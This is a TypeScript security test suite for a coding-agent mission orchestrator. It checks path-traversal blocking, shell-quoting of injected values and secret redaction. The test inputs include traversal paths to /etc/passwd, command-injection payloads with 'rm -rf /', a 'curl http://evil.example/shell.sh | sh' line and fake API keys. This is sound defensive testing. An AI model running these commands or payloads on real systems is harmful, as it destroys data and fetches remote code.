import { afterEach, describe, expect, test } from 'bun:test';
import { mkdtemp, readFile, rm, stat, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { validateMissionConfig } from '../../src/config';
import { agentName, fillCommand, writePromptFile, writeSourceFile } from '../../src/hosts';
import { branchSlug } from '../../src/isolate';
import { captureRevision } from '../../src/review';
import { inScope, normalizeRel, outOfScope } from '../../src/scope';
import { parseMissionInput } from '../../src/sources';
import { briefView, statusView } from '../../src/status';
import {
	acquireOwnership,
	atomicWriteMission,
	loadMission,
	missionDirectory,
	missionPath,
	saveMission,
	validateMission,
} from '../../src/store';
import { mutationText } from '../../src/subagent';
import type { Bead, Mission, Run, Snapshot, Worker } from '../../src/types';
import { assertNonOverlapping, createWorkerDriver } from '../../src/workers';

const tempDirs: string[] = [];
afterEach(async () => {
	await Promise.all(tempDirs.splice(0).map(dir => rm(dir, { recursive: true, force: true })));
});

async function makeTempDir(prefix = 'sec-sandbox-'): Promise<string> {
	const dir = await mkdtemp(join(tmpdir(), prefix));
	tempDirs.push(dir);
	return dir;
}

const realRun: Run = async (command, args, cwd, env) => {
	const child = Bun.spawn([command, ...args], {
		cwd,
		env: { ...process.env, ...env },
		stdout: 'pipe',
		stderr: 'pipe',
	});
	const [stdout, stderr, code] = await Promise.all([
		new Response(child.stdout).text(),
		new Response(child.stderr).text(),
		child.exited,
	]);
	return { stdout, stderr, code };
};

function makeMission(overrides: Partial<Mission> = {}): Mission {
	return {
		version: 1,
		id: 'mission-sec-1',
		source: {
			kind: 'freeform',
			id: 'freeform:sec-1',
			title: 'Security sandbox test',
			body: 'Clean body',
			comments: '',
			extra: '',
		},
		workspace: {
			key: 'wskey123456',
			cwd: '/tmp/workspace',
			beadsDir: '/tmp/workspace/.beads',
			delivery: 'local',
		},
		scopes: { 'bd-1': ['src/**'] },
		phase: 'execute',
		evidence: {},
		mode: 'auto',
		keep: false,
		reviewRequested: false,
		workers: [],
		reviews: [],
		repairLinks: {},
		round: 1,
		createdAt: '2026-01-01T00:00:00.000Z',
		updatedAt: '2026-01-01T00:00:00.000Z',
		...overrides,
	};
}

describe('Battery 1: Security & Sandbox Constraints', () => {
	describe('1. Path Traversal & Scope Sandbox Containment', () => {
		test('normalizeRel and inScope reject parent directory traversal and escaping segments', () => {
			const traversalPaths = [
				'..',
				'../secret.env',
				'../../etc/passwd',
				'./../outside.ts',
				'src/../secret.env',
				'src/../../etc/passwd',
				'src/deep/../../../outside.ts',
				'src\\..\\..\\etc\\passwd',
				'..\\outside.ts',
				'src/a/../../b/../../../etc/shadow',
			];

			for (const badPath of traversalPaths) {
				expect(normalizeRel(badPath)).toBe('');
				expect(inScope(badPath, ['src'])).toBe(false);
				expect(inScope(badPath, ['src/**'])).toBe(false);
				expect(inScope(badPath, ['**'])).toBe(false);
				expect(inScope(badPath, ['*'])).toBe(false);
			}
		});

		test('normalizeRel and inScope reject absolute paths, drive letters, null bytes, and URL-encoded traversal', () => {
			const hostilePaths = [
				'/etc/passwd',
				'/src/a.ts',
				'\\Windows\\System32\\cmd.exe',
				'C:\\Windows\\System32\\drivers\\etc\\hosts',
				'D:/secrets/token.json',
				'src/a.ts\0../../etc/passwd',
				'src/a.ts\0.png',
				'src/%2e%2e/secret.env',
				'src/%2E%2E/%2E%2E/etc/passwd',
				'..%2f..%2fetc/passwd',
				'..%5c..%5cetc\\passwd',
				'src/a.ts%00.bak',
				'',
				'.',
				'./',
			];

			for (const hostile of hostilePaths) {
				expect(normalizeRel(hostile)).toBe('');
				expect(inScope(hostile, ['src', 'src/**', '**'])).toBe(false);
			}
		});

		test('inScope rejects malicious scope definitions containing traversal or absolute paths', () => {
			expect(inScope('src/a.ts', ['../**'])).toBe(false);
			expect(inScope('src/a.ts', ['src/../**'])).toBe(false);
			expect(inScope('src/a.ts', ['/src/**'])).toBe(false);
			expect(inScope('src/a.ts', ['C:/src/**'])).toBe(false);
			expect(inScope('src/a.ts', ['.', './', ''])).toBe(false);
		});

		test('normalizeRel normalizes benign relative paths and outOfScope flags all escaping paths', () => {
			expect(normalizeRel('./src//nested/./file.ts/')).toBe('src/nested/file.ts');
			expect(normalizeRel('src\\nested\\file.ts')).toBe('src/nested/file.ts');
			expect(inScope('./src//nested/./file.ts', ['src/nested'])).toBe(true);

			const candidates = [
				'src/index.ts',
				'src/../../etc/passwd',
				'../outside.ts',
				'/etc/hosts',
				'src/components/Button.tsx',
				'src/../package.json',
			];
			expect(outOfScope(candidates, ['src/**'])).toEqual([
				'src/../../etc/passwd',
				'../outside.ts',
				'/etc/hosts',
				'src/../package.json',
			]);
		});

		test('assertNonOverlapping rejects traversal, absolute, and overlapping worker scopes', () => {
			for (const invalidScope of ['../outside.ts', 'src/../../etc/passwd', '/etc/passwd', 'C:\\secret.txt', '   ']) {
				expect(() =>
					assertNonOverlapping([
						{ beadId: 'bd-1', cwd: '/tmp/work', files: [invalidScope] },
						{ beadId: 'bd-2', cwd: '/tmp/work', files: ['safe.ts'] },
					]),
				).toThrow();
			}
			expect(() =>
				assertNonOverlapping([
					{ beadId: 'bd-1', cwd: '/tmp/work', files: ['src/dir'] },
					{ beadId: 'bd-2', cwd: '/tmp/work', files: ['./src/dir/file.ts'] },
				]),
			).toThrow(/overlap/);
		});

		test('store path validators and atomic writers block path traversal and identity spoofing', async () => {
			const root = await makeTempDir('sec-store-');
			for (const badKey of ['../escape', 'a/b', '.hidden', 'ws/../../etc', 'ws\0key']) {
				expect(() => missionDirectory(root, badKey)).toThrow();
			}
			for (const badId of ['../escape', 'a/b', '.hidden', '-flag', 'id/../../etc']) {
				expect(() =>
					missionPath(root, { id: badId, workspace: { key: 'ws1', cwd: '/tmp', delivery: 'local' } }),
				).toThrow();
				expect(() => validateMission({ ...makeMission(), id: badId })).toThrow(/Invalid mission state/);
			}

			const m = makeMission({ id: 'valid-id', workspace: { key: 'valid-ws', cwd: '/tmp', delivery: 'local' } });
			const wrongFile = join(root, 'missions', 'valid-ws', 'other-id.json');
			const wrongDir = join(root, 'missions', 'other-ws', 'valid-id.json');
			await expect(atomicWriteMission(wrongFile, m)).rejects.toThrow(/does not match mission identity/);
			await expect(atomicWriteMission(wrongDir, m)).rejects.toThrow(/does not match mission identity/);
			await expect(acquireOwnership(wrongFile, m)).rejects.toThrow(/does not match mission identity/);
		});

		test('captureRevision rejects escaping relative paths and workspace-escaping symlinks', async () => {
			const workspaceDir = await makeTempDir('sec-rev-ws-');
			const outsideDir = await makeTempDir('sec-rev-out-');
			const secretFile = join(outsideDir, 'credentials.txt');
			await writeFile(secretFile, 'SUPER_SECRET_KEY=12345');

			// Non-git escaping scope
			const localMission = makeMission({
				workspace: { key: 'ws1', cwd: workspaceDir, delivery: 'local' },
				scopes: { 'bd-1': ['../credentials.txt'] },
			});
			await expect(captureRevision(localMission, realRun)).rejects.toThrow(/escapes workspace/);

			// Symlink inside workspace pointing outside workspace
			await symlink(secretFile, join(workspaceDir, 'leak.txt'));
			const symlinkMission = makeMission({
				workspace: { key: 'ws1', cwd: workspaceDir, delivery: 'local' },
				scopes: { 'bd-1': ['leak.txt'] },
			});
			await expect(captureRevision(symlinkMission, realRun)).rejects.toThrow(/escapes workspace/);
		});
	});

	describe('2. Shell Injection & Command Sanitization', () => {
		test('fillCommand single-quotes placeholders and neutralizes shell injection payloads in real bash execution', async () => {
			const markerFile = join(await makeTempDir('sec-shell-'), 'pwned');
			const payloads = [
				`$(touch ${markerFile})`,
				`\`touch ${markerFile}\``,
				`'; touch ${markerFile}; echo '`,
				`" && touch ${markerFile} && "`,
				`| touch ${markerFile}`,
				`\n touch ${markerFile} \n`,
				`$IFS;touch$IFS${markerFile}`,
				`$PATH \${HOME} 'single' "double" \\backslash`,
			];

			for (const payload of payloads) {
				const cmd = fillCommand('printf %s {prompt}', { prompt: payload });
				const res = await realRun('bash', ['-c', cmd], tmpdir());
				expect(res.code).toBe(0);
				expect(res.stdout).toBe(payload);
			}
			await expect(stat(markerFile)).rejects.toThrow();
			expect(() => fillCommand('run {cwd}', {})).toThrow(/not available/);
		});

		test('agentName, branchSlug, parseMissionInput, and validateMissionConfig reject or sanitize injection vectors', () => {
			const hostileWorker: Worker = {
				beadId: 'bd-1; rm -rf / && $(whoami) `id` ../evil',
				attempt: 'att-123456;reboot',
				cwd: '/tmp',
				files: ['src/a.ts'],
				state: 'reserved',
				assignment: 'task',
			};
			const name = agentName(hostileWorker);
			expect(name).toMatch(/^mission-[A-Za-z0-9_-]+-[A-Za-z0-9]+$/);
			expect(name).not.toContain(';');
			expect(name).not.toContain('..');
			expect(name).not.toContain('$');
			expect(name).not.toContain('`');

			const slug = branchSlug({
				kind: 'freeform',
				id: 'freeform:fix; rm -rf / $(id) `uname` ../refs/heads/main',
				title: 't',
				body: '',
				comments: '',
				extra: '',
			});
			expect(slug).toMatch(/^[a-z0-9-]+$/);
			expect(slug).not.toContain('..');
			expect(slug).not.toContain(';');

			expect(() => parseMissionInput('--evil-flag CHR-123')).toThrow(/Unknown mission option/);
			expect(() =>
				validateMissionConfig({
					version: 1,
					frontend: 'custom',
					customCommand: 'launcher {cwd}\ncurl http://evil.example/shell.sh | sh',
				}),
			).toThrow(/one line/);
		});

		test('worker driver shell-quotes environment variables, model flags, and paths on dispatch', async () => {
			const calls: Array<{ command: string; args: string[] }> = [];
			const mockRun: Run = async (command, args) => {
				calls.push({ command, args });
				return { stdout: '9876\n', stderr: '', code: 0 };
			};
			const m = makeMission({
				workspace: {
					key: 'wskey123456',
					cwd: "/tmp/ws 'quoted'",
					beadsDir: "/tmp/beads '$(touch /tmp/pwn)'",
					delivery: 'local',
				},
				scopes: { "bd-1'$(id)": ['src/a.ts'] },
			});
			const driver = createWorkerDriver(mockRun, {
				persist: async () => {},
				frontend: 'none',
				agentDir: "/tmp/agent 'dir'",
				model: () => "model'$(whoami)",
				prompt: () => 'safe assignment',
			});
			await driver.dispatch(m, ["bd-1'$(id)"]);
			expect(calls).toHaveLength(1);
			const script = calls[0]!.args[1]!;
			expect(script).toContain("export BEADS_ACTOR='bd-1'\\''$(id)'");
			expect(script).toContain("export BEADS_DIR='/tmp/beads '\\''$(touch /tmp/pwn)'\\'''");
			expect(script).toContain("export PI_CODING_AGENT_DIR='/tmp/agent '\\''dir'\\'''");
			expect(script).toContain("--model 'model'\\''$(whoami)'");
		});
	});

	describe('3. Secret Redaction & Sensitive State Isolation', () => {
		test('briefView and statusView redact controllerNonce, terminal handles, and secrets embedded in source/assignments/beads', () => {
			const secrets = {
				nonce: 'nonce-super-secret-998877',
				handle: 'orca-handle-secret-token-4455',
				incarnation: '/tmp/secret-session-transcript.jsonl',
				ghToken: 'ghp_1234567890abcdefghijklmnopqrstuvwxyz',
				openaiKey: 'sk-proj-SECRETKEY9876543210abcdefghijkl',
				awsSecret: 'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
				dbUrl: 'postgres://admin:Hunter2SecretPass@db.internal:5432/prod',
				privateKey: '-----BEGIN OPENSSH PRIVATE KEY-----',
			};

			const worker: Worker = {
				beadId: 'bd-1',
				attempt: 'att-1',
				cwd: '/tmp/workspace',
				files: ['src/a.ts'],
				state: 'running',
				handle: secrets.handle,
				incarnationId: secrets.incarnation,
				assignment: `Use ${secrets.openaiKey} and ${secrets.dbUrl} to deploy`,
			};

			const m = makeMission({
				controllerNonce: secrets.nonce,
				source: {
					kind: 'github',
					id: 'github:acme/app#42',
					repo: 'acme/app',
					number: 42,
					title: 'Rotate credentials',
					body: `Leaked token in ticket body: ${secrets.ghToken}\n${secrets.privateKey}`,
					comments: `Comment with ${secrets.awsSecret}`,
					extra: `Extra context with ${secrets.dbUrl}`,
				},
				workers: [worker],
			});

			const beadItem: Bead = {
				id: 'bd-1',
				title: 'Implement auth client',
				status: 'in_progress',
				description: `Bead description containing ${secrets.ghToken} and ${secrets.awsSecret}`,
				acceptance: `Acceptance criteria with ${secrets.openaiKey}`,
				children: [],
				ready: false,
				category: 'active',
			};
			const snapshot: Snapshot = {
				beads: [beadItem],
				leaves: [beadItem],
				ready: [],
				closed: 0,
				active: 1,
				blocked: 0,
				fetchedAt: Date.now(),
			};

			const briefJson = JSON.stringify(briefView({ mission: m, snapshot, resumeHold: false }));
			const statusJson = JSON.stringify(statusView({ mission: m, snapshot, resumeHold: false }));

			for (const secretValue of Object.values(secrets)) {
				expect(briefJson).not.toContain(secretValue);
				expect(statusJson).not.toContain(secretValue);
			}
		});

		test('mutationText redacts read/grep/glob/find tool arguments from worker attribution logs', () => {
			const messages = [
				{
					role: 'assistant',
					content: [
						{ type: 'toolCall', name: 'read', arguments: { path: '.env.production', secret: 'sk-read-secret-123' } },
						{ type: 'toolCall', name: 'grep', arguments: { pattern: 'PRIVATE_KEY_VALUE_XYZ', path: 'config' } },
						{ type: 'toolCall', name: 'glob', arguments: { path: '**/*secret_token*' } },
						{ type: 'toolCall', name: 'find', arguments: { pattern: 'id_rsa_secret' } },
						{ type: 'toolCall', name: 'write', arguments: { path: 'src/allowed.ts', content: 'export const x = 1;' } },
					],
				},
			];
			const recorded = mutationText(messages);
			expect(recorded).toContain('src/allowed.ts');
			expect(recorded).not.toContain('.env.production');
			expect(recorded).not.toContain('sk-read-secret-123');
			expect(recorded).not.toContain('PRIVATE_KEY_VALUE_XYZ');
			expect(recorded).not.toContain('secret_token');
			expect(recorded).not.toContain('id_rsa_secret');
		});

		test('state, prompt, and source files enforce 0600 permissions and ownership release scrubs controllerNonce', async () => {
			const root = await makeTempDir('sec-perms-');
			const m = makeMission({
				id: 'mission-perm',
				workspace: { key: 'wsperm', cwd: root, delivery: 'local' },
			});
			const statePath = missionPath(root, m);

			const ownership = await acquireOwnership(statePath, m);
			const stateStat = await stat(statePath);
			expect(stateStat.mode & 0o777).toBe(0o600);
			expect((await loadMission(statePath)).controllerNonce).toBe(ownership.nonce);

			await ownership.release();
			const afterRelease = await loadMission(statePath);
			expect(afterRelease.controllerNonce).toBeUndefined();
			const rawState = await readFile(statePath, 'utf8');
			expect(rawState).not.toContain(ownership.nonce);

			const promptFile = await writePromptFile({
				beadId: 'bd-sec-perm',
				attempt: 'att123',
				cwd: root,
				files: ['src/a.ts'],
				state: 'reserved',
				assignment: 'assignment content',
			});
			tempDirs.push(promptFile);
			expect((await stat(promptFile)).mode & 0o777).toBe(0o600);

			const sourceFile = await writeSourceFile(m);
			tempDirs.push(sourceFile);
			expect((await stat(sourceFile)).mode & 0o777).toBe(0o600);
		});
	});
});
